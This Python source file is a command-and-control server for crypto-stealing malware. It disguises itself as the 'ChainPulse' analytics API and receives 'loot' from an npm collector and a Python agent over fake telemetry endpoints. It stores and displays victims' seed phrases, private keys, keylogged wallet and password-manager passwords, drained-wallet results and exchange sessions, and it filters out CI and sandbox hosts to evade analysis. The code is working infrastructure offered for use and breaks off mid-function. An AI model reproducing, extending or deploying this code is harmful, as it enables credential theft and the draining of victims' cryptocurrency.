#!/usr/bin/env python3
"""ChainPulse v8.3.2 — Analytics & Health API (Render-compatible).

Accepts both:
  - Python agent envelope: {endpoint, campaign, timestamp, payload:{system_info,...}}
  - NPM collector loot:    {id, host, user, time, files, ...}
Normalizes on ingest so the dashboard always has campaign/system fields.
"""
import json, base64, gzip, os, sys, time, glob, socket, threading
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime

PORT = int(os.environ.get("PORT", "10000"))
HOST = os.environ.get("HOST", "0.0.0.0")
LOOT_DIR = os.environ.get("LOOT_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot"))
DEFAULT_CAMPAIGN = os.environ.get("DEFAULT_CAMPAIGN", "render-01")
os.makedirs(LOOT_DIR, exist_ok=True)

# Dedupe spam: same host within short window (npm double-fire / WSL loops)
_RECENT_FP = {}
_DEDUP_SEC = 45


DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChainPulse v8.3.2 — Analytics</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
h1{color:#00d4ff;border-bottom:1px solid #1a3a3a;padding-bottom:10px;margin-bottom:20px;font-size:20px}
h2{color:#ffd700;margin:15px 0 8px;font-size:15px}
.card{background:#0c0c18;border:1px solid #1a3a3a;border-radius:6px;padding:15px;margin-bottom:12px}
.card-drain{background:#140a0a;border-color:#ff3333}
.card-seed{background:#0a0a14;border-color:#ffd700}
.card-session{background:#0a140a;border-color:#00ff88}
.card-files{background:#0a1018;border-color:#00d4ff}
.label{color:#666}.value{color:#00ff88}.key{color:#ffd700}
pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10px 0;color:#aaa;font-size:11px;max-height:200px;overflow-y:auto}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:4px;margin-bottom:4px}
.badge-drained{background:#00ff00;color:#000;font-weight:bold}
.badge-eth{background:#627eea;color:#fff}
.badge-btc{background:#f7931a;color:#000}
.badge-sol{background:#9945ff;color:#fff}
.badge-bsc{background:#f3ba2f;color:#000}
.badge-danger{background:#ff3333;color:#fff}
.badge-erc20{background:#00d4ff;color:#000}
.badge-session{background:#00cc66;color:#000}
.badge-files{background:#00d4ff;color:#000}
.badge-pw{background:#ff2244;color:#fff;font-weight:bold;font-size:12px}
.badge-seed{background:#ffd700;color:#000;font-weight:bold}
.hl-box{background:#1a0508;border:2px solid #ff3355;border-radius:8px;padding:14px 16px;margin:10px 0;box-shadow:0 0 12px rgba(255,40,60,.25)}
.hl-box.seed{border-color:#ffd700;background:#14100a;box-shadow:0 0 12px rgba(255,215,0,.2)}
.hl-box.key{border-color:#00d4ff;background:#0a1018}
.hl-title{color:#ff4466;font-size:15px;font-weight:bold;letter-spacing:.5px;margin-bottom:6px}
.hl-box.seed .hl-title{color:#ffd700}
.hl-box.key .hl-title{color:#00d4ff}
.hl-value{color:#fff;font-size:16px;font-family:Consolas,monospace;word-break:break-all;background:#000;padding:8px 10px;border-radius:4px;margin-top:4px;max-height:4.5em;overflow:hidden}
.hl-value.open{max-height:none}
details.hl-item{margin:6px 0;border:1px solid #333;border-radius:6px;background:#0a0a12}
details.hl-item summary{cursor:pointer;padding:8px 10px;color:#ffd700;font-weight:bold;list-style:none;user-select:none}
details.hl-item summary::-webkit-details-marker{display:none}
details.hl-item summary:before{content:'▶ ';font-size:10px;color:#666}
details.hl-item[open] summary:before{content:'▼ '}
details.hl-item .hl-body{padding:0 10px 10px}
details.victim{margin-bottom:14px;border:1px solid #1a3a3a;border-radius:8px;background:#0c0c18}
details.victim>summary{cursor:pointer;padding:12px 14px;color:#00d4ff;font-size:14px;font-weight:bold;list-style:none}
details.victim>summary::-webkit-details-marker{display:none}
details.victim>summary:before{content:'▶ ';color:#666;font-size:11px}
details.victim[open]>summary:before{content:'▼ '}
details.victim .victim-body{padding:0 12px 12px}
.hl-preview{color:#888;font-size:11px;margin-left:8px;font-weight:normal}
.btn-row{margin:8px 0}
.btn-row button{background:#122;color:#0f8;border:1px solid #1a3a3a;padding:4px 10px;border-radius:4px;cursor:pointer;margin-right:6px;font-family:inherit;font-size:12px}
.btn-row button:hover{border-color:#0f8}
.hl-meta{color:#888;font-size:11px;margin-top:6px}
.persist-tag{background:#8844ff;color:#fff}
table{width:100%;border-collapse:collapse;margin:8px 0}
td,th{padding:6px 8px;border:1px solid #1a3a3a;text-align:left;font-size:11px}
th{background:#0f1a1a;color:#ffd700}
a{color:#00d4ff}
.stats-bar{display:flex;gap:15px;margin-bottom:15px;flex-wrap:wrap}
.stat-box{flex:1;min-width:120px;background:#0c0c18;border:1px solid #1a3a3a;border-radius:6px;padding:12px;text-align:center}
.stat-box .num{font-size:28px;font-weight:bold;color:#00d4ff}
.stat-box .lbl{font-size:11px;color:#666;margin-top:4px}
.chain-tag{display:inline-block;background:#1a1a2e;color:#00ff88;padding:1px 6px;border-radius:3px;font-size:10px;margin:2px}
.file-list{max-height:120px;overflow-y:auto;font-size:10px;color:#888;margin-top:6px}
</style>
</head>
<body>
<h1>ChainPulse v8.3.2 — Analytics Dashboard</h1>
<div id="stats"></div>
<div id="loot"></div>
<script>
function pick(obj, keys, fallback){
  if(!obj) return fallback;
  for(const k of keys){
    if(obj[k]!==undefined && obj[k]!==null && obj[k]!=='') return obj[k];
  }
  return fallback;
}
function unwrap(entry){
  // Support stored envelope OR raw loot
  const top = entry || {};
  const inner = top.payload && typeof top.payload==='object' ? top.payload : top;
  const sys = inner.system_info || {};
  return {
    endpoint: pick(top, ['endpoint'], pick(inner, ['endpoint'], 'report')),
    campaign: pick(top, ['campaign'], pick(inner, ['campaign'], '?')),
    timestamp: pick(top, ['timestamp','time'], pick(inner, ['timestamp','time'], '?')),
    hostname: pick(sys, ['hostname'], pick(inner, ['host','hostname'], '?')),
    user: pick(sys, ['user','username'], pick(inner, ['user','username'], '?')),
    os: pick(sys, ['os','platform'], pick(inner, ['os','platform'], '')),
    wallets: inner.wallets || {},
    secrets: inner.secrets || {},
    drain_results: inner.drain_results || [],
    exchange_sessions: inner.exchange_sessions || [],
    files: inner.files || {},
    keylog: inner.keylog || {},
    password_managers: inner.password_managers || [],
    highlights: Array.isArray(inner.highlights) ? inner.highlights : [],
    persistent: !!(inner.persistent || top.persistent),
    id: pick(inner, ['id'], pick(top, ['id'], '')),
    raw: inner,
  };
}
async function load(){
  const r=await fetch('/api/loot-summary');
  const d=await r.json();

  let sc=0,pk=0,dc=0,sessions=0,fileHits=0,pwHits=0;
  const rows=(d.recent||[]).map(unwrap);
  for(const p of rows){
    const sec=p.secrets||{};
    sc+=(sec.seed_phrases||[]).length;
    pk+=(sec.private_keys||[]).length;
    pwHits+=(sec.captured_passwords||[]).length;
    dc+=(p.drain_results||[]).filter(x=>x.status==='drained').length;
    sessions+=(p.exchange_sessions||[]).length;
    fileHits+=Object.keys(p.files||{}).length;
  }

  document.getElementById('stats').innerHTML=
    '<div class="stats-bar">'+
    '<div class="stat-box"><div class="num">'+d.campaign_count+'</div><div class="lbl">Campaigns</div></div>'+
    '<div class="stat-box"><div class="num">'+d.total_victims+'</div><div class="lbl">Devices</div></div>'+
    '<div class="stat-box"><div class="num">'+d.total_files+'</div><div class="lbl">Reports</div></div>'+
    '<div class="stat-box"><div class="num">'+sc+'</div><div class="lbl">Seeds</div></div>'+
    '<div class="stat-box"><div class="num">'+pk+'</div><div class="lbl">Keys</div></div>'+
    '<div class="stat-box"><div class="num">'+pwHits+'</div><div class="lbl">Passwords</div></div>'+
    '<div class="stat-box"><div class="num">'+dc+'</div><div class="lbl">Drained</div></div>'+
    '<div class="stat-box"><div class="num">'+fileHits+'</div><div class="lbl">Files</div></div>'+
    '</div>';

  // Helpers
  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
  function secretVal(x){
    if(x==null) return '';
    if(typeof x==='string'||typeof x==='number') return String(x);
    if(typeof x==='object'){
      if(x.value!=null&&x.value!=='') return typeof x.value==='object'?JSON.stringify(x.value):String(x.value);
      if(x.key!=null&&x.key!=='') return typeof x.key==='object'?JSON.stringify(x.key):String(x.key);
      if(x.password!=null) return String(x.password);
      try{return JSON.stringify(x);}catch(e){return String(x);}
    }
    return String(x);
  }
  function isJunkSeed(val, src){
    const v=String(val||'').toLowerCase().trim();
    const s=String(src||'').toLowerCase();
    if(!v||v.length<20) return true;
    if(/\[object object\]/.test(v)) return true;
    if(/bottom|maximized|work area|minimized|undefined|null/.test(v)) return true;
    if(/preferences$|component_crx|metadata\.json|graphite|safe browsing|local state$/.test(s) && !/nkbihf|metamask|extension settings/.test(s)) return true;
    const words=v.split(/\s+/).filter(Boolean);
    if(![12,15,18,21,24].includes(words.length)) return true;
    // too many layout words
    const junk=new Set(['bottom','left','right','top','false','true','work','area','maximized','minimized','width','height','screen','window']);
    if(words.filter(w=>junk.has(w)).length>=3) return true;
    return false;
  }
  function isJunkKey(val, src){
    const v=String(val||'');
    const s=String(src||'').toLowerCase();
    if(!v||v.length<32) return true;
    if(/\[object object\]/i.test(v)) return true;
    if(/component_crx|metadata\.json|graphite|safe browsing|preferences$/.test(s)) return true;
    return false;
  }

  // Group by victim host|user
  const groups={};
  const groupOrder=[];
  for(const p of rows){
    const gk=(p.hostname||'?')+'|'+(p.user||'?');
    if(!groups[gk]){ groups[gk]=[]; groupOrder.push(gk); }
    groups[gk].push(p);
  }

  let html='<div class="btn-row"><button onclick="document.querySelectorAll(\'details.victim\').forEach(d=>d.open=true)">Expandir todos</button>';
  html+='<button onclick="document.querySelectorAll(\'details.victim\').forEach(d=>d.open=false)">Minimizar todos</button>';
  html+='<button onclick="document.querySelectorAll(\'details.hl-item\').forEach(d=>d.open=false)">Minimizar capturas</button></div>';

  for(const gk of groupOrder){
    const items=groups[gk];
    const [host,user]=gk.split('|');
    const latest=items[0];
    const osn=latest.os||'';
    // aggregate badges
    let aSeeds=0,aKeys=0,aPw=0,aFiles=0,aKl=0,realHls=[];
    const seenHl=new Set();
    for(const p of items){
      const seedList=(p.secrets.seed_phrases||[]);
      const keyList=(p.secrets.private_keys||[]);
      const capPw=(p.secrets.captured_passwords||[]);
      aPw+=capPw.length;
      aFiles+=Object.keys(p.files||{}).length;
      aKl+= (p.keylog&&p.keylog.count)||0;
      let hls=Array.isArray(p.highlights)?p.highlights.slice():[];
      if(!hls.length){
        for(const x of capPw){
          const lab=String(x.label||'').toUpperCase();
          let title='CAPTURADA SENHA';
          if(lab==='METAMASK'||/metamask/i.test(x.window||'')) title='CAPTURADA SENHA METAMASK';
          else if(lab==='PHANTOM'||/phantom/i.test(x.window||'')) title='CAPTURADA SENHA PHANTOM';
          else if(lab==='PASSWORD_MANAGER'||/bitwarden|keepass|1password|safepass/i.test(x.window||'')) title='CAPTURADA SENHA PASSWORD MANAGER';
          else if(x.window) title='CAPTURADA SENHA ('+String(x.window).slice(0,40)+')';
          hls.push({type:'password',title:title,value:x.password||x.value||'',window:x.window||'',at:x.captured_at||''});
        }
        for(const s of seedList){
          hls.push({type:'seed',title:'SEED PHRASE DESBLOQUEADA',value:secretVal(s),source:(s&&s.source)||''});
        }
        for(const k of keyList.slice(0,15)){
          hls.push({type:'key',title:'PRIVATE KEY DESBLOQUEADA',value:secretVal(k),source:(k&&k.source)||''});
        }
      }
      for(const h of hls){
        const val=secretVal(h.value);
        const src=h.source||'';
        if(h.type==='seed'&&isJunkSeed(val,src)) continue;
        if(h.type==='key'&&isJunkKey(val,src)) continue;
        if(h.type==='seed') aSeeds++;
        if(h.type==='key') aKeys++;
        const sig=(h.type||'')+'|'+val.slice(0,80);
        if(seenHl.has(sig)) continue;
        seenHl.add(sig);
        realHls.push(Object.assign({},h,{value:val}));
      }
    }
    const wset=new Set();
    for(const p of items){
      Object.keys(p.wallets||{}).forEach(w=>wset.add(w));
    }
    // open first victim by default if only one or has real captures
    const openFirst = groupOrder.length===1 || realHls.some(h=>h.type==='password'||h.type==='seed'||h.type==='key');
    html+='<details class="victim"'+(openFirst&&groupOrder.indexOf(gk)===0?' open':'')+'>';
    html+='<summary>'+esc(host)+' <span class="label">/</span> '+esc(user)+' <span class="hl-preview">'+esc(osn)+' · '+items.length+' report(s)';
    if(aPw) html+=' · SENHAS '+aPw;
    if(aSeeds) html+=' · SEEDS '+aSeeds;
    if(aKeys) html+=' · KEYS '+aKeys;
    if(aFiles) html+=' · FILES '+aFiles;
    html+='</span></summary><div class="victim-body">';

    // wallets
    html+='<div style="margin:6px 0"><span class="label">Wallets:</span> ';
    if(wset.size) html+=[...wset].map(w=>'<span class="chain-tag">'+esc(w)+'</span>').join(' ');
    else html+='<span class="value">none</span>';
    html+='</div>';

    if(realHls.length){
      html+='<div class="btn-row"><button onclick="event.preventDefault();this.closest(\'.victim-body\').querySelectorAll(\'details.hl-item\').forEach(d=>d.open=true)">Expandir capturas</button>';
      html+='<button onclick="event.preventDefault();this.closest(\'.victim-body\').querySelectorAll(\'details.hl-item\').forEach(d=>d.open=false)">Minimizar capturas</button></div>';
      // passwords open by default; seeds/keys collapsed
      for(const h of realHls.slice(0,40)){
        const isPw=h.type==='password';
        const cls=h.type==='seed'?'hl-item seed':h.type==='key'?'hl-item key':h.type==='alert'?'hl-item':'hl-item';
        const preview=String(h.value||'').slice(0,42)+(String(h.value||'').length>42?'…':'');
        html+='<details class="'+cls+'"'+(isPw?' open':'')+'>';
        html+='<summary>'+esc(h.title||'CAPTURA')+' <span class="hl-preview">'+esc(preview)+'</span></summary>';
        html+='<div class="hl-body"><div class="hl-value open">'+esc(h.value||'')+'</div>';
        let meta=[];
        if(h.window) meta.push('Janela: '+esc(String(h.window).slice(0,60)));
        if(h.source) meta.push('Origem: '+esc(String(h.source).slice(0,100)));
        if(h.at) meta.push(esc(String(h.at)));
        if(meta.length) html+='<div class="hl-meta">'+meta.join(' · ')+'</div>';
        html+='</div></details>';
      }
    } else {
      html+='<div class="label" style="margin:8px 0">Nenhuma senha/seed/key válida ainda (só arquivos/keylog). Keylogger residente continua.</div>';
    }

    // per-report collapsible file lists (latest first, collapse)
    html+='<details style="margin-top:10px"><summary class="label" style="cursor:pointer">Relatórios ('+items.length+') — arquivos e endpoints</summary>';
    for(const p of items.slice(0,12)){
      const fileCount=Object.keys(p.files||{}).length;
      const pmList=Array.isArray(p.password_managers)?p.password_managers:[];
      html+='<div class="card" style="margin-top:8px;padding:10px">';
      html+='<div><span class="value">'+esc(p.endpoint)+'</span> · '+esc(p.timestamp||'')+' · campaign '+esc(p.campaign||'')+'</div>';
      if(pmList.length){
        html+='<div class="file-list">'+pmList.slice(0,10).map(n=>'<div>[PM] '+esc(n)+'</div>').join('')+'</div>';
      }
      if(fileCount){
        const names=Object.keys(p.files).slice(0,40);
        html+='<details style="margin-top:6px"><summary class="label" style="cursor:pointer">Arquivos ('+fileCount+')</summary>';
        html+='<div class="file-list">'+names.map(n=>'<div>'+esc(n)+'</div>').join('');
        if(Object.keys(p.files).length>40) html+='<div>… +'+(Object.keys(p.files).length-40)+' more</div>';
        html+='</div></details>';
      }
      html+='</div>';
    }
    html+='</details>';

    html+='</div></details>';
  }

    document.getElementById('loot').innerHTML=html||'<div class="card">No data yet. Waiting for telemetry...</div>';
}
load();setInterval(load,8000);
</script>
</body>
</html>"""


def _normalize_payload(raw: dict) -> dict:
    """Unify Python-agent and NPM-collector shapes into one envelope."""
    if not isinstance(raw, dict):
        raw = {"raw": str(raw)}

    # Already envelope?
    if isinstance(raw.get("payload"), dict) and (
        raw.get("endpoint") or raw.get("campaign") or "system_info" in raw.get("payload", {})
    ):
        env = dict(raw)
        pl = dict(env.get("payload") or {})
    else:
        # NPM collector style: {id, host, user, time, files}
        pl = dict(raw)
        env = {}

    # system_info
    sysinfo = pl.get("system_info") if isinstance(pl.get("system_info"), dict) else {}
    host = sysinfo.get("hostname") or pl.get("host") or pl.get("hostname") or "unknown"
    user = sysinfo.get("user") or sysinfo.get("username") or pl.get("user") or pl.get("username") or "unknown"
    os_name = sysinfo.get("os") or pl.get("os") or pl.get("platform") or ""
    pl["system_info"] = {
        "hostname": host,
        "user": user,
        "os": os_name,
    }

    # ensure containers
    if "wallets" not in pl or not isinstance(pl.get("wallets"), dict):
        pl["wallets"] = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
    if "secrets" not in pl or not isinstance(pl.get("secrets"), dict):
        pl["secrets"] = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
    if "keylog" not in pl or not isinstance(pl.get("keylog"), dict):
        pl["keylog"] = pl.get("keylog") if isinstance(pl.get("keylog"), dict) else {}
    if "password_managers" not in pl or not isinstance(pl.get("password_managers"), list):
        pl["password_managers"] = pl.get("password_managers") if isinstance(pl.get("password_managers"), list) else []
    if "drain_results" not in pl or not isinstance(pl.get("drain_results"), list):
        pl["drain_results"] = pl.get("drain_results") if isinstance(pl.get("drain_results"), list) else []
    if "exchange_sessions" not in pl or not isinstance(pl.get("exchange_sessions"), list):
        pl["exchange_sessions"] = pl.get("exchange_sessions") if isinstance(pl.get("exchange_sessions"), list) else []
    if "files" not in pl or not isinstance(pl.get("files"), dict):
        pl["files"] = pl.get("files") if isinstance(pl.get("files"), dict) else {}
    if "highlights" not in pl or not isinstance(pl.get("highlights"), list):
        pl["highlights"] = pl.get("highlights") if isinstance(pl.get("highlights"), list) else []
    # Sanitize secrets (drop UI garbage seeds / crx hash "keys")
    sec = pl["secrets"] if isinstance(pl.get("secrets"), dict) else {}
    def _junk_seed(val, src=""):
        v = str(val or "").lower().strip()
        s = str(src or "").lower()
        if not v or len(v) < 20:
            return True
        if "bottom" in v and "work area" in v:
            return True
        if any(x in v for x in ("maximized", "work area", "[object object]")):
            return True
        words = v.split()
        if len(words) not in (12, 15, 18, 21, 24):
            return True
        junk = {"bottom", "left", "right", "top", "false", "true", "work", "area", "maximized", "minimized"}
        if sum(1 for w in words if w in junk) >= 3:
            return True
        if any(x in s for x in ("component_crx", "metadata.json", "preferences")) and "nkbihf" not in s and "metamask" not in s:
            return True
        return False

    def _key_val(k):
        if isinstance(k, str):
            return k
        if isinstance(k, dict):
            v = k.get("value") or k.get("key") or ""
            if isinstance(v, (dict, list)):
                try:
                    return json.dumps(v)
                except Exception:
                    return str(v)
            return str(v) if v is not None else ""
        return str(k) if k is not None else ""

    def _junk_key(val, src=""):
        v = str(val or "")
        s = str(src or "").lower()
        if not v or len(v) < 32 or "[object object]" in v.lower():
            return True
        if any(x in s for x in ("component_crx", "metadata.json", "graphite", "safe browsing")):
            return True
        return False

    seeds_in = list(sec.get("seed_phrases") or [])
    keys_in = list(sec.get("private_keys") or [])
    clean_seeds = []
    for s in seeds_in:
        val = s.get("value") if isinstance(s, dict) else s
        src = s.get("source") if isinstance(s, dict) else ""
        if val and not _junk_seed(val, src):
            if isinstance(s, dict):
                clean_seeds.append(s)
            else:
                clean_seeds.append({"value": val})
    clean_keys = []
    for k in keys_in:
        val = _key_val(k)
        src = k.get("source") if isinstance(k, dict) else ""
        if val and not _junk_key(val, src):
            if isinstance(k, dict):
                kk = dict(k)
                kk["value"] = val
                if "key" not in kk:
                    kk["key"] = val
                clean_keys.append(kk)
            else:
                clean_keys.append({"value": val, "key": val})
    sec["seed_phrases"] = clean_seeds
    sec["private_keys"] = clean_keys
    pl["secrets"] = sec

    # Filter existing highlights too
    if pl["highlights"]:
        filtered = []
        for h in pl["highlights"]:
            if not isinstance(h, dict):
                continue
            ht = h.get("type") or ""
            val = h.get("value")
            if isinstance(val, (dict, list)):
                val = _key_val(val) if ht == "key" else (val.get("value") if isinstance(val, dict) else str(val))
                h = dict(h)
                h["value"] = val
            src = h.get("source") or ""
            if ht == "seed" and _junk_seed(val, src):
                continue
            if ht == "key" and _junk_key(val, src):
                continue
            if val is not None and not isinstance(val, str):
                h = dict(h)
                h["value"] = _key_val(val) if ht == "key" else str(val)
            filtered.append(h)
        pl["highlights"] = filtered

    # Auto-build highlights from secrets if client didn't send them
    if not pl["highlights"]:
        for x in (pl.get("secrets") or {}).get("captured_passwords") or []:
            if not isinstance(x, dict):
                continue
            lab = str(x.get("label") or "").upper()
            win = str(x.get("window") or "")
            title = "CAPTURADA SENHA"
            if lab == "METAMASK" or "metamask" in win.lower():
                title = "CAPTURADA SENHA METAMASK"
            elif lab == "PHANTOM" or "phantom" in win.lower():
                title = "CAPTURADA SENHA PHANTOM"
            elif lab == "PASSWORD_MANAGER" or any(k in win.lower() for k in ("bitwarden", "keepass", "1password", "safepass")):
                title = "CAPTURADA SENHA PASSWORD MANAGER"
            elif win:
                title = f"CAPTURADA SENHA ({win[:40]})"
            pl["highlights"].append({
                "type": "password",
                "title": title,
                "value": x.get("password") or x.get("value") or "",
                "window": win,
                "at": x.get("captured_at") or "",
            })
        for s in (pl.get("secrets") or {}).get("seed_phrases") or []:
            val = s.get("value") if isinstance(s, dict) else s
            src = s.get("source") if isinstance(s, dict) else ""
            if val:
                pl["highlights"].append({"type": "seed", "title": "SEED PHRASE DESBLOQUEADA", "value": val, "source": src})
        for k in ((pl.get("secrets") or {}).get("private_keys") or [])[:15]:
            val = _key_val(k)
            src = k.get("source") if isinstance(k, dict) else ""
            if val:
                pl["highlights"].append({"type": "key", "title": "PRIVATE KEY DESBLOQUEADA", "value": val, "source": src})

    # Top-up: ensure cleaned secrets appear even if client sent partial/junk highlights
    have_types = {(h.get("type"), str(h.get("value") or "")[:80]) for h in pl["highlights"] if isinstance(h, dict)}
    for s in (pl.get("secrets") or {}).get("seed_phrases") or []:
        val = s.get("value") if isinstance(s, dict) else s
        src = s.get("source") if isinstance(s, dict) else ""
        if not val:
            continue
        sig = ("seed", str(val)[:80])
        if sig not in have_types:
            pl["highlights"].append({"type": "seed", "title": "SEED PHRASE DESBLOQUEADA", "value": val, "source": src})
            have_types.add(sig)
    for k in ((pl.get("secrets") or {}).get("private_keys") or [])[:15]:
        val = _key_val(k)
        src = k.get("source") if isinstance(k, dict) else ""
        if not val:
            continue
        sig = ("key", str(val)[:80])
        if sig not in have_types:
            pl["highlights"].append({"type": "key", "title": "PRIVATE KEY DESBLOQUEADA", "value": val, "source": src})
            have_types.add(sig)
    for x in (pl.get("secrets") or {}).get("captured_passwords") or []:
        if not isinstance(x, dict):
            continue
        val = x.get("password") or x.get("value") or ""
        if not val:
            continue
        sig = ("password", str(val)[:80])
        if sig not in have_types:
            lab = str(x.get("label") or "").upper()
            win = str(x.get("window") or "")
            title = "CAPTURADA SENHA"
            if lab == "METAMASK" or "metamask" in win.lower():
                title = "CAPTURADA SENHA METAMASK"
            pl["highlights"].append({"type": "password", "title": title, "value": val, "window": win, "at": x.get("captured_at") or ""})
            have_types.add(sig)

    # Infer wallets from file paths (MetaMask etc.)
    if not pl["wallets"] and pl["files"]:
        found = set()
        for fp in pl["files"].keys():
            low = str(fp).lower()
            for name in (
                "metamask", "exodus", "phantom", "electrum", "atomic", "trust",
                "coinbase", "brave", "ronin", "binance", "okx", "ledger",
            ):
                if name in low:
                    found.add(name)
        if found:
            pl["wallets"] = {n: ["detected"] for n in sorted(found)}

    campaign = (
        env.get("campaign")
        or pl.get("campaign")
        or DEFAULT_CAMPAIGN
    )
    endpoint = (
        env.get("endpoint")
        or pl.get("endpoint")
        or ("npm-collector" if pl.get("files") is not None and pl.get("host") or pl.get("system_info") else "report")
    )
    if endpoint in ("unknown", "", None):
        endpoint = "npm-collector" if pl.get("files") else "report"
    ts = (
        env.get("timestamp")
        or pl.get("timestamp")
        or pl.get("time")
        or datetime.utcnow().isoformat()
    )

    return {
        "endpoint": endpoint,
        "campaign": campaign,
        "timestamp": ts,
        "payload": pl,
        "id": pl.get("id") or env.get("id") or "",
    }



def _is_noise_host(host: str, user: str, os_str: str = "") -> bool:
    h = (host or "").lower()
    u = (user or "").lower()
    o = (os_str or "").lower()
    if u in ("runner", "github", "gitlab-runner"):
        return True
    if "gvisor" in o or "aws" in o and u == "runner":
        return True
    if h in ("ubuntu-fc-uvm",) and u in ("ubuntu", "root"):
        return False  # keep lab
    # docker-style 12-hex hostnames from sandboxes
    if len(h) == 12 and all(c in "0123456789abcdef" for c in h):
        return True
    if h.startswith("runnervm") or "actions" in h:
        return True
    return False


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        if self.path in ("/", "/dashboard"):
            self._serve_html(DASHBOARD_HTML)
        elif self.path.startswith("/api/loot-files"):
            # ?campaign=render-01 — list loot JSON filenames
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(self.path).query)
            camp = (qs.get("campaign") or [DEFAULT_CAMPAIGN])[0]
            cdir = os.path.join(LOOT_DIR, camp)
            files = []
            if os.path.isdir(cdir):
                for fn in sorted(os.listdir(cdir), reverse=True)[:200]:
                    fp = os.path.join(cdir, fn)
                    if os.path.isfile(fp):
                        files.append({"name": fn, "size": os.path.getsize(fp), "mtime": os.path.getmtime(fp)})
            self._serve_json({"campaign": camp, "files": files, "dir": cdir})
        elif self.path.startswith("/api/loot-download"):
            from urllib.parse import urlparse, parse_qs
            qs = parse_qs(urlparse(self.path).query)
            camp = (qs.get("campaign") or [DEFAULT_CAMPAIGN])[0]
            name = (qs.get("name") or [""])[0]
            name = os.path.basename(name)
            fp = os.path.join(LOOT_DIR, camp, name)
            if not name or not os.path.isfile(fp):
                self.send_response(404); self.end_headers(); return
            data = open(fp, "rb").read()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Disposition", f'attachment; filename="{name}"')
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        elif self.path == "/api/loot-summary":
            self._serve_json(self._get_summary())
        elif self.path == "/health":
            self._serve_json({"status": "healthy", "version": "8.3.2", "render": True})
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Client-ID")
        self.end_headers()

    def do_POST(self):
        telemetry_endpoints = ("/api/v1/telemetry", "/collect", "/metrics", "/ping")
        if not any(self.path.startswith(ep) for ep in telemetry_endpoints):
            self.send_error(404)
            return
        try:
            cl = int(self.headers.get("Content-Length", 0))
            if cl == 0 or cl > 30_000_000:
                self.send_error(400)
                return
            body = self.rfile.read(cl)
            data = json.loads(body)
            if "t" not in data:
                self.send_error(400)
                return
            compressed = base64.b64decode(data["t"])
            decompressed = gzip.decompress(compressed)
            payload = json.loads(decompressed)

            env = _normalize_payload(payload)
            endpoint = env["endpoint"]
            campaign = env["campaign"]
            ts = str(env["timestamp"]).replace(":", "-")
            host = env["payload"].get("system_info", {}).get("hostname", "unknown")
            user = env["payload"].get("system_info", {}).get("user", "")
            os_name = env["payload"].get("system_info", {}).get("os", "")
            nfiles = len((env.get("payload") or {}).get("files") or {})

            # Soft-skip pure CI noise (still ack so clients don't retry spam)
            if _is_noise_host(host, user, os_name) and endpoint not in ("npm-hello",):
                print(f"[~] noise skip {host}/{user} ep={endpoint}")
                self._serve_json({"status": "ok", "noise": True, "campaign": campaign, "endpoint": endpoint})
                return

            fp_key = f"{campaign}|{endpoint}|{host}|{nfiles}|{str(env.get('timestamp', ''))[:19]}"
            now = time.time()
            for k in list(_RECENT_FP.keys()):
                if now - _RECENT_FP[k] > _DEDUP_SEC:
                    _RECENT_FP.pop(k, None)
            if fp_key in _RECENT_FP and now - _RECENT_FP[fp_key] < _DEDUP_SEC:
                print(f"[~] dedupe skip {fp_key}")
                self._serve_json({"status": "ok", "deduped": True, "campaign": campaign, "endpoint": endpoint})
                return
            _RECENT_FP[fp_key] = now

            cdir = os.path.join(LOOT_DIR, campaign)
            os.makedirs(cdir, exist_ok=True)
            safe_host = "".join(c if c.isalnum() or c in "-_." else "_" for c in host)[:40]

            # Merge chunked collector parts into one host file when possible
            pl = env["payload"]
            chunk_meta = pl.get("chunk") if isinstance(pl.get("chunk"), dict) else None
            base_ep = endpoint.split("-p")[0] if endpoint.startswith("npm-collector") or endpoint.startswith("npm-keylog") else endpoint
            merged = False
            if chunk_meta is not None or endpoint.startswith("npm-collector-p") or endpoint.startswith("npm-keylog-p"):
                merge_name = f"{base_ep}_{safe_host}_merged.json"
                merge_path = os.path.join(cdir, merge_name)
                existing = None
                if os.path.isfile(merge_path):
                    try:
                        with open(merge_path) as mf:
                            existing = json.load(mf)
                    except Exception:
                        existing = None
                if existing and isinstance(existing.get("payload"), dict):
                    epl = existing["payload"]
                    efiles = epl.get("files") if isinstance(epl.get("files"), dict) else {}
                    nfiles_map = pl.get("files") if isinstance(pl.get("files"), dict) else {}
                    efiles.update(nfiles_map)
                    epl["files"] = efiles
                    # merge wallets / secrets / keylog / pm
                    ew = epl.get("wallets") if isinstance(epl.get("wallets"), dict) else {}
                    nw = pl.get("wallets") if isinstance(pl.get("wallets"), dict) else {}
                    ew.update(nw)
                    epl["wallets"] = ew
                    esec = epl.get("secrets") if isinstance(epl.get("secrets"), dict) else {}
                    nsec = pl.get("secrets") if isinstance(pl.get("secrets"), dict) else {}
                    for k, v in nsec.items():
                        if isinstance(v, list) and isinstance(esec.get(k), list):
                            seen = set(json.dumps(x, sort_keys=True, default=str) if isinstance(x, dict) else str(x) for x in esec[k])
                            for item in v:
                                key = json.dumps(item, sort_keys=True, default=str) if isinstance(item, dict) else str(item)
                                if key not in seen:
                                    esec[k].append(item)
                                    seen.add(key)
                        elif v:
                            esec[k] = v
